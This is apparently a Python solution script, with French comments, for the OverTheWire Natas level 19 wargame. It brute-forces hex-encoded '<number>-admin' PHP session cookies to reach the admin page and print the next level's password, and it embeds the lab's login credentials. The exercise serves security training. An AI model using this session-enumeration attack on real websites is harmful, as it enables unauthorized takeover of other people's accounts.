#!/usr/bin/python
# -*- coding: utf-8 -*-

# importation des librairies
import requests # gestion des requêtes
import tqdm     # gestion de la bar de progression

# Url du site
url = "http://natas19.natas.labs.overthewire.org"

# Connexion du site
s = requests.Session()
s.auth = ('natas19', '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')

raw_response = ""

# brute force le cookie 
for x in tqdm.tqdm(range(1000)):
    tmp = str(x) + "-admin"         # Ajout utilisateur admin
    val = tmp.encode('ascii').hex() # Conversion en hexadecimal

    cookies = dict(PHPSESSID=val)   
    r = s.get(url, cookies=cookies) # instensation du cookies et récupération de contenu de la réponse.
    if "Login as an admin to retrieve" in r.text: # Si contien se message alors on est pas sur la page administrateur 
        pass
    else:
        raw_response = (r.text) # Sinon c'est bon
        break
        

# Extraction des lignes
lines = raw_response.split('\n')
line_test = None

# Si Password trouvé on extrait la ligne.
for line in lines:
    if "Password" in line:
        line_test = line
        break

# Affichage de la ligne contenant "Password" s'il a été trouvé
if line_test:
    print("Ligne contenant 'Password:", line_test)
else:
    print("Pas de mot de passe trouvé")
